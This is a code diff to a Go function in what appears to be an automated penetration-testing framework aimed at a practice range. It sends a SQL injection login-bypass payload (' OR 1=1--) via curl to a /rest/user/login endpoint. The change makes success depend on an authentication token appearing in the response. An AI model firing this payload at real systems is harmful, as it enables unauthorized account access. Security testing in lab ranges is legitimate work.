@@ -148,10 +148,18 @@ func exploitSQLiLogin(args map[string]any) tools.ToolResult {
 	defer os.Remove(f.Name())
 	_, _ = f.WriteString(`{"email":"' OR 1=1--","password":"x"}`)
 	_ = f.Close()
-	return tools.Sh([]string{"curl", "-s", "-4", "--max-time", "20",
+	res := tools.Sh([]string{"curl", "-s", "-4", "--max-time", "20",
 		"--retry", "3", "--retry-delay", "2", "--retry-all-errors", // 前置工具(nuclei)过载靶场后自动重试
 		"-X", "POST", target + "/rest/user/login", "-H", "Content-Type: application/json",
 		"--data", "@" + f.Name()}, 90*time.Second)
+	// 成功判定对齐 ParseSQLi: 响应必须携带 authentication token 才是认证绕过成功。
+	// 修: 原实现仅看进程退出码 —— 空 body/代理 502 也会被当作“利用成功”,
+	// 内核 produces 机制据此误建 web_shell 节点并贯通攻击链(证据是伪造的)。
+	if res.Success && !strings.Contains(res.Stdout, `"authentication"`) {
+		return tools.ToolResult{Success: false, Stdout: res.Stdout,
+			Stderr: "exploit_sqli: 响应未含 authentication token, 认证绕过未成功", RC: res.RC}
+	}
+	return res
 }
 
 // normalizeURL —— 目标 URL 归一化: 无 scheme 补 http; host:443 自动识别为 https
